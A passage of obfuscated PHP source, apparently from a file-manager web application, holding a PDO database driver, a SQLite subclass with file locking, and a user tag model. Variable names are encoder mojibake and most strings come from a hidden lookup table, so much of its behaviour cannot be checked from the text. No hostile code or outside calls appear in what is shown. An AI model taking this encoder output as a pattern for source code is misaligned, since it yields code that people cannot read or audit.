$ÈŒ¥­—ä[$®«ğü»Ì[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ª‰¸¥] = new PDO($ÈŒ¥­—ä[$®«ğü»Ì[994]], $ÈŒ¥­—ä[$®«ğü»Ì[966]], $ÈŒ¥­—ä[$®«ğü»Ì[967]], $ÈŒ¥­—ä[$®«ğü»Ì[17]]); } catch (PDOException $í©ËşúÙ) { think_exception($í©ËşúÙ->getMessage()); } $this->dbType = $this->_getDsnType($ÈŒ¥­—ä[$®«ğü»Ì[994]]); if (in_array($this->dbType, array($®«ğü»Ì[995], $®«ğü»Ì[996], $®«ğü»Ì[997], $®«ğü»Ì[998]))) { think_exception($®«ğü»Ì[999] . $this->dbType . $®«ğü»Ì[1000] . $this->dbType . $®«ğü»Ì[1001]); } if (!$this->linkID[$ª‰¸¥]) { think_exception($®«ğü»Ì[1002]); } try { $this->linkID[$ª‰¸¥]->exec($®«ğü»Ì[1003] . think_config($®«ğü»Ì[969])); } catch (Exception $í©ËşúÙ) { } $this->connected = !0; if (1 != think_config($®«ğü»Ì[22])) { unset($this->config); } } return $this->linkID[$ª‰¸¥]; } public function free() { $this->PDOStatement = null; } public function query($ˆ¥´ğ¬İ, $ĞÅ¶úøã = array()) { $‚İ¯ó²² =& $_SERVER[¦»×‡Ãã]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ˆ¥´ğ¬İ; if (!empty($ĞÅ¶úøã)) { $this->queryStr .= $‚İ¯ó²²[1004] . print_r($ĞÅ¶úøã, !0) . $‚İ¯ó²²[1005]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($‚İ¯ó²²[23], 1); think_status($‚İ¯ó²²[24]); $this->PDOStatement = $this->_linkID->prepare($ˆ¥´ğ¬İ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $”£¡ûãå = $this->PDOStatement->execute($ĞÅ¶úøã); $this->debug(); if (!1 === $”£¡ûãå) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ã˜§™æã, $Şò©¬Ñî = array()) { $‚õ‡åÆÜ =& $_SERVER[¦»×‡Ãã]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ã˜§™æã; if (!empty($Şò©¬Ñî)) { $this->queryStr .= $‚õ‡åÆÜ[1004] . print_r($Şò©¬Ñî, !0) . $‚õ‡åÆÜ[1005]; } $Ç¡¡Ñ½Î = !1; if ($this->dbType == $‚õ‡åÆÜ[998]) { if (preg_match($‚õ‡åÆÜ[1006], $this->queryStr, $Ö‹òª´û)) { $this->table = think_config($‚õ‡åÆÜ[1007]) . str_ireplace(think_config($‚õ‡åÆÜ[1008]), $‚õ‡åÆÜ[454], $Ö‹òª´û[2]); $Ç¡¡Ñ½Î = (bool) $this->query($‚õ‡åÆÜ[1009] . strtoupper($this->table) . $‚õ‡åÆÜ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($‚õ‡åÆÜ[25], 1); think_status($‚õ‡åÆÜ[24]); $this->PDOStatement = $this->_linkID->prepare($ã˜§™æã); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $²éöêŒ¥ = $this->PDOStatement->execute($Şò©¬Ñî); $this->debug(); if (!1 === $²éöêŒ¥) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ç¡¡Ñ½Î || preg_match($‚õ‡åÆÜ[1010], $ã˜§™æã)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¦ÛÃÖ€ = $this->_linkID->commit(); $this->transTimes = 0; if (!$¦ÛÃÖ€) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ûœ£ÆÌŠ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ûœ£ÆÌŠ) { $this->error(); return !1; } } return !0; } private function getAll() { $ˆ¥ûõšÀ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ˆ¥ûõšÀ); return $ˆ¥ûõšÀ; } public function getFields($ô¶Œ‹“¶) { $«Ş¾Á®„ =& $_SERVER[¦»×‡Ãã]; $this->initConnect(!0); if (think_config($«Ş¾Á®„[1011])) { $¼¤ä­Ó— = str_replace($«Ş¾Á®„[1012], $ô¶Œ‹“¶, think_config($«Ş¾Á®„[1011])); } else { switch ($this->dbType) { case $«Ş¾Á®„[995]: case $«Ş¾Á®„[1013]: $¼¤ä­Ó— = "\123\x45\x4c\105\x43\x54\40\40\40\143\157\x6c\165\155\156\137\x6e\141\155\x65\x20\141\x73\x20\x27\116\141\155\145\x27\54\40\x20\40\144\x61\x74\x61\x5f\164\x79\160\x65\40\141\x73\40\x27\124\x79\160\145\x27\54\x20\40\40\x63\157\154\165\x6d\x6e\137\144\x65\146\141\x75\x6c\164\40\x61\x73\x20\x27\x44\145\146\141\165\154\164\47\54\40\40\40\151\163\x5f\156\165\x6c\x6c\x61\x62\x6c\145\40\x61\163\x20\47\116\165\154\x6c\47\12\x9\11\106\122\117\x4d\11\x69\x6e\x66\157\x72\x6d\x61\x74\151\x6f\156\137\x73\x63\x68\145\x6d\x61\x2e\164\x61\142\154\145\163\x20\101\123\x20\164\12\x9\x9\112\117\x49\116\x9\x69\x6e\146\157\162\x6d\141\x74\151\157\x6e\137\x73\x63\x68\x65\155\141\56\x63\157\x6c\165\155\x6e\163\x20\x41\123\x20\x63\12\11\11\117\116\40\x20\164\x2e\x74\x61\142\154\145\x5f\143\141\164\x61\x6c\x6f\x67\40\x3d\40\143\x2e\164\x61\142\154\145\x5f\143\x61\x74\x61\154\157\147\xa\x9\11\101\x4e\x44\40\x74\x2e\x74\141\x62\154\x65\x5f\163\x63\x68\x65\155\x61\40\x3d\40\143\x2e\x74\141\x62\x6c\x65\x5f\x73\143\x68\x65\155\x61\xa\11\11\101\116\104\x20\x74\x2e\164\141\x62\x6c\145\x5f\156\141\x6d\x65\x20\75\x20\143\x2e\x74\x61\x62\154\145\137\x6e\x61\x6d\145\12\x9\11\127\x48\x45\x52\105\x20\40\x20\x74\56\x74\x61\142\x6c\145\x5f\156\x61\155\x65\40\75\x20\x27{$ô¶Œ‹“¶}\x27"; break; case $«Ş¾Á®„[1014]: $¼¤ä­Ó— = $«Ş¾Á®„[1015] . $ô¶Œ‹“¶ . $«Ş¾Á®„[1016]; break; case $«Ş¾Á®„[996]: case $«Ş¾Á®„[998]: $¼¤ä­Ó— = $«Ş¾Á®„[1017] . $«Ş¾Á®„[1018] . $«Ş¾Á®„[1019] . strtoupper($ô¶Œ‹“¶) . $«Ş¾Á®„[1020] . strtoupper($ô¶Œ‹“¶) . $«Ş¾Á®„[1021]; break; case $«Ş¾Á®„[1022]: $¼¤ä­Ó— = $«Ş¾Á®„[1023] . $ô¶Œ‹“¶ . $«Ş¾Á®„[1024]; break; case $«Ş¾Á®„[997]: break; case $«Ş¾Á®„[1025]: default: $¼¤ä­Ó— = $«Ş¾Á®„[1026] . ($this->dbType == $«Ş¾Á®„[1025] ? "\x60{$ô¶Œ‹“¶}\140" : $ô¶Œ‹“¶); } } $Í‚ò¼Ë = $this->query($¼¤ä­Ó—); $é¥­™—Ê = array(); if ($Í‚ò¼Ë) { foreach ($Í‚ò¼Ë as $Æ’ ›Š— => $Û¥¸Éß§) { $Û¥¸Éß§ = array_change_key_case($Û¥¸Éß§); $Û¥¸Éß§[$«Ş¾Á®„[32]] = isset($Û¥¸Éß§[$«Ş¾Á®„[32]]) ? $Û¥¸Éß§[$«Ş¾Á®„[32]] : $«Ş¾Á®„[454]; $Û¥¸Éß§[$«Ş¾Á®„[33]] = isset($Û¥¸Éß§[$«Ş¾Á®„[33]]) ? $Û¥¸Éß§[$«Ş¾Á®„[33]] : $«Ş¾Á®„[454]; $çÈÏÏ«ø = isset($Û¥¸Éß§[$«Ş¾Á®„[350]]) ? $Û¥¸Éß§[$«Ş¾Á®„[350]] : $Û¥¸Éß§[$«Ş¾Á®„[32]]; $é¥­™—Ê[$çÈÏÏ«ø] = array($«Ş¾Á®„[32] => $çÈÏÏ«ø, $«Ş¾Á®„[33] => $Û¥¸Éß§[$«Ş¾Á®„[33]], $«Ş¾Á®„[35] => (bool) (isset($Û¥¸Éß§[$«Ş¾Á®„[106]]) && $Û¥¸Éß§[$«Ş¾Á®„[106]] === $«Ş¾Á®„[12] || isset($Û¥¸Éß§[$«Ş¾Á®„[35]]) && $Û¥¸Éß§[$«Ş¾Á®„[35]] === $«Ş¾Á®„[12]), $«Ş¾Á®„[37] => isset($Û¥¸Éß§[$«Ş¾Á®„[37]]) ? $Û¥¸Éß§[$«Ş¾Á®„[37]] : (isset($Û¥¸Éß§[$«Ş¾Á®„[56]]) ? $Û¥¸Éß§[$«Ş¾Á®„[56]] : $«Ş¾Á®„[454]), $«Ş¾Á®„[39] => isset($Û¥¸Éß§[$«Ş¾Á®„[97]]) ? strtolower($Û¥¸Éß§[$«Ş¾Á®„[97]]) == $«Ş¾Á®„[41] : (isset($Û¥¸Éß§[$«Ş¾Á®„[57]]) ? $Û¥¸Éß§[$«Ş¾Á®„[57]] : !1), $«Ş¾Á®„[42] => isset($Û¥¸Éß§[$«Ş¾Á®„[1027]]) ? strtolower($Û¥¸Éß§[$«Ş¾Á®„[1027]]) == $«Ş¾Á®„[44] : (isset($Û¥¸Éß§[$«Ş¾Á®„[97]]) ? $Û¥¸Éß§[$«Ş¾Á®„[97]] : !1)); } } return $é¥­™—Ê; } public function getTables($ÛÙ·¥Ô¤ = '') { $Ï –€É— =& $_SERVER[¦»×‡Ãã]; if (think_config($Ï –€É—[1028])) { $ş†ÔĞ¡ = str_replace($Ï –€É—[1029], $ÛÙ·¥Ô¤, think_config($Ï –€É—[1028])); } else { switch ($this->dbType) { case $Ï –€É—[996]: case $Ï –€É—[998]: $ş†ÔĞ¡ = $Ï –€É—[1030]; break; case $Ï –€É—[995]: case $Ï –€É—[1013]: $ş†ÔĞ¡ = $Ï –€É—[1031]; break; case $Ï –€É—[1022]: $ş†ÔĞ¡ = $Ï –€É—[1032]; break; case $Ï –€É—[997]: think_exception(think_lang($Ï –€É—[1033]) . $Ï –€É—[1034]); break; case $Ï –€É—[1014]: $ş†ÔĞ¡ = $Ï –€É—[45] . $Ï –€É—[46] . $Ï –€É—[47]; break; case $Ï –€É—[1025]: default: if (!empty($ÛÙ·¥Ô¤)) { $ş†ÔĞ¡ = $Ï –€É—[977] . $ÛÙ·¥Ô¤ . $Ï –€É—[978]; } else { $ş†ÔĞ¡ = $Ï –€É—[979]; } } } $×á°ö½ = $this->query($ş†ÔĞ¡); $ß–Ì¯®© = array(); foreach ($×á°ö½ as $Ö€‚§ÉÒ => $ «„ê»ó) { $ß–Ì¯®©[$Ö€‚§ÉÒ] = current($ «„ê»ó); } return $ß–Ì¯®©; } protected function parseLimit($…ê‚ö­) { $‚“ó•Á =& $_SERVER[¦»×‡Ãã]; $ŸíŒŒ‹ğ = $‚“ó•Á[12]; if (!empty($…ê‚ö­)) { switch ($this->dbType) { case $‚“ó•Á[1022]: case $‚“ó•Á[1014]: $…ê‚ö­ = explode($‚“ó•Á[50], $…ê‚ö­); if (count($…ê‚ö­) > 1) { $ŸíŒŒ‹ğ .= $‚“ó•Á[51] . $…ê‚ö­[1] . $‚“ó•Á[52] . $…ê‚ö­[0] . $‚“ó•Á[53]; } else { $ŸíŒŒ‹ğ .= $‚“ó•Á[51] . $…ê‚ö­[0] . $‚“ó•Á[53]; } break; case $‚“ó•Á[995]: case $‚“ó•Á[1013]: break; case $‚“ó•Á[997]: break; case $‚“ó•Á[996]: case $‚“ó•Á[998]: break; case $‚“ó•Á[1025]: default: $ŸíŒŒ‹ğ .= $‚“ó•Á[51] . $…ê‚ö­ . $‚“ó•Á[53]; } } return $ŸíŒŒ‹ğ; } public function parseKey(&$¹üÈ»·€, $äºé·Î = true) { $áçµ¿ÆÕ =& $_SERVER[¦»×‡Ãã]; if ($äºé·Î) { $¹üÈ»·€ = $this->parseKeyCheck($¹üÈ»·€); } if ($this->dbType == $áçµ¿ÆÕ[1025]) { if ($¹üÈ»·€ != $áçµ¿ÆÕ[220] && !preg_match($áçµ¿ÆÕ[989], $¹üÈ»·€)) { $¹üÈ»·€ = $áçµ¿ÆÕ[461] . trim($¹üÈ»·€, $áçµ¿ÆÕ[461]) . $áçµ¿ÆÕ[461]; } return $¹üÈ»·€; } else { return parent::parseKey($¹üÈ»·€, $äºé·Î); } } public function close() { $this->_linkID = null; } public function error() { $ïõ¬Ãò§ =& $_SERVER[¦»×‡Ãã]; if ($this->PDOStatement) { $ÑÂ’ù½£ = $this->PDOStatement->errorInfo(); $this->error = $ÑÂ’ù½£[1] . $ïõ¬Ãò§[4] . $ÑÂ’ù½£[2]; } else { $this->error = $ïõ¬Ãò§[12]; } if ($ïõ¬Ãò§[12] != $this->queryStr) { $this->error .= LNG($ïõ¬Ãò§[48]) . $this->queryStr; } think_trace($this->error, $ïõ¬Ãò§[12], $ïõ¬Ãò§[49]); return $this->error; } public function escapeString($—•š‚ñ) { $Ö¾Àóç´ =& $_SERVER[¦»×‡Ãã]; switch ($this->dbType) { case $Ö¾Àóç´[1022]: case $Ö¾Àóç´[995]: case $Ö¾Àóç´[1013]: case $Ö¾Àóç´[1025]: return addslashes($—•š‚ñ); case $Ö¾Àóç´[997]: case $Ö¾Àóç´[1014]: case $Ö¾Àóç´[996]: case $Ö¾Àóç´[998]: return str_ireplace($Ö¾Àóç´[58], $Ö¾Àóç´[59], $—•š‚ñ); } } protected function parseValue($Ï¯Ëğöê) { $ı÷à©œ =& $_SERVER[¦»×‡Ãã]; if (is_string($Ï¯Ëğöê)) { $‚òøŠ÷Š = strpos($Ï¯Ëğöê, $ı÷à©œ[4]) === 0 && in_array($Ï¯Ëğöê, array_keys($this->bind)); $Ï¯Ëğöê = $‚òøŠ÷Š ? $this->escapeString($Ï¯Ëğöê) : $ı÷à©œ[1035] . $this->escapeString($Ï¯Ëğöê) . $ı÷à©œ[1035]; } elseif (isset($Ï¯Ëğöê[0]) && is_string($Ï¯Ëğöê[0]) && strtolower($Ï¯Ëğöê[0]) == $ı÷à©œ[373]) { $Ï¯Ëğöê = $this->escapeString($Ï¯Ëğöê[1]); } elseif (is_array($Ï¯Ëğöê)) { $Ï¯Ëğöê = array_map(array($this, $ı÷à©œ[1036]), $Ï¯Ëğöê); } elseif (is_bool($Ï¯Ëğöê)) { $Ï¯Ëğöê = $Ï¯Ëğöê ? $ı÷à©œ[91] : $ı÷à©œ[228]; } elseif (is_null($Ï¯Ëğöê)) { $Ï¯Ëğöê = $ı÷à©œ[106]; } return $Ï¯Ëğöê; } public function getLastInsertId() { $©˜Öİø =& $_SERVER[¦»×‡Ãã]; switch ($this->dbType) { case $©˜Öİø[1022]: case $©˜Öİø[1014]: case $©˜Öİø[995]: case $©˜Öİø[1013]: case $©˜Öİø[997]: case $©˜Öİø[1025]: return $this->_linkID->lastInsertId(); case $©˜Öİø[996]: case $©˜Öİø[998]: $øÍá†ı = $this->table; $€Ê¸áë = $this->query("\x53\x45\x4c\x45\x43\124\x20{$øÍá†ı}\x2e\x63\165\x72\162\x76\x61\154\x20\143\x75\x72\x72\166\141\x6c\x20\106\x52\x4f\x4d\x20\144\165\x61\154"); return $€Ê¸áë ? $€Ê¸áë[0][$©˜Öİø[1037]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($à˜¶º) { $µÄ±¥Ï =& $_SERVER[¦»×‡Ãã]; if (!CacheLock::fileLock($µÄ±¥Ï[13])) { return !1; } $ğ¦œ¬çÖ = parent::query($à˜¶º); CacheLock::fileUnLock($µÄ±¥Ï[13]); return $ğ¦œ¬çÖ; } public function execute($ˆè¢Ï) { $ˆ‘˜€ÛÛ =& $_SERVER[¦»×‡Ãã]; if (!CacheLock::fileLock($ˆ‘˜€ÛÛ[13])) { return !1; } $€ŸÑàé« = parent::execute($ˆè¢Ï); CacheLock::fileUnLock($ˆ‘˜€ÛÛ[13]); return $€ŸÑàé«; } } goto dòŒ³¯¨È; AÑÕïŒšëÜ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($×ƒÙœ›å) { $œ­ÉôÕ =& $_SERVER[¦»×‡Ãã]; return array($œ­ÉôÕ[2086] => array($œ­ÉôÕ[2500] . USER_ID, $œ­ÉôÕ[2087])); } protected function listData() { $õÎ©«Ğ =& $_SERVER[¦»×‡Ãã]; $şæÉõİ¹ = array($õÎ©«Ğ[1763] => USER_ID, $õÎ©«Ğ[557] => array($õÎ©«Ğ[2090], 0)); $Åä×…ùÌ = $õÎ©«Ğ[2501]; $š™¢Ú¸ = $this->field($Åä×…ùÌ)->where($şæÉõİ¹)->order($õÎ©«Ğ[2093])->select(); return $š™¢Ú¸ ? $š™¢Ú¸ : array(); } protected function addToTag($…—¦ìæ›, $ùõÈğÊ´) { $½¦ÏÔò =& $_SERVER[¦»×‡Ãã]; if (!Model($½¦ÏÔò[2237])->listData($ùõÈğÊ´)) { return !1; } if (is_numeric($…—¦ìæ›)) { $¿÷†¨è‹ = Model($½¦ÏÔò[897])->pathInfo($…—¦ìæ›); if (!$¿÷†¨è‹) { return !1; } } else { $¿÷†¨è‹ = IO::infoSimple($…—¦ìæ›); if (!$¿÷†¨è‹) { return !1; } $×®÷Çô = $¿÷†¨è‹[$½¦ÏÔò[32]]; $ÔØÁæÖÏ = $¿÷†¨è‹[$½¦ÏÔò[33]]; if (isset($¿÷†¨è‹[$½¦ÏÔò[485]])) { $ÔØÁæÖÏ = $¿÷†¨è‹[$½¦ÏÔò[485]] == $½¦ÏÔò[91] ? $½¦ÏÔò[78] : $½¦ÏÔò[230]; } } $Ğª¿ãÀ = array($½¦ÏÔò[1763] => USER_ID, $½¦ÏÔò[557] => $ùõÈğÊ´, $½¦ÏÔò[495] => $…—¦ìæ›, $½¦ÏÔò[496] => $ÔØÁæÖÏ ? $ÔØÁæÖÏ : $½¦ÏÔò[490], $½¦ÏÔò[494] => $×®÷Çô ? $×®÷Çô : $½¦ÏÔò[12], $½¦ÏÔò[1975] => 0); if ($this->where($Ğª¿ãÀ)->find()) { return !1; } return $this->add($Ğª¿ãÀ); } protected function removeFromTag($ó‡æ’Úµ, $Ò½õêÍ) { $´ÃÀĞÑğ =& $_SERVER[¦»×‡Ãã]; if (!Model($´ÃÀĞÑğ[2237])->listData($Ò½õêÍ)) { return !1; } if (is_array($ó‡æ’Úµ)) { $ó‡æ’Úµ = array($´ÃÀĞÑğ[7], $ó‡æ’Úµ); } $÷ç´¢ = array($´ÃÀĞÑğ[1763] => USER_ID, $´ÃÀĞÑğ[557] => $Ò½õêÍ, $´ÃÀĞÑğ[495] => $ó‡æ’Úµ); return $this->where($÷ç´¢)->delete(); } protected function removeByTag($å×ªÒ†Ş) { $‰½±¿—Ç =& $_SERVER[¦»×‡Ãã]; if (!$å×ªÒ†Ş) { return !1; } $¾ûö¾ùÛ = array($‰½±¿—Ç[1763] => USER_ID, $‰½±¿—Ç[557] => $å×ªÒ†Ş); return $this->where($¾ûö¾ùÛ)->delete(); } protected function removeBySource($çÚÔ­ş) { $‡üö»– =& $_SERVER[¦»×‡Ãã]; if (is_array($çÚÔ­ş)) { $çÚÔ­ş = array($‡üö»–[7], $çÚÔ­ş); } $Õ€ø—Œ = array($‡üö»–[1763] => USER_ID, $‡üö»–[557] => array($‡üö»–[1092], 0), $‡üö»–[495] => $çÚÔ­ş); return $this->where($Õ€ø—Œ)->delete(); } }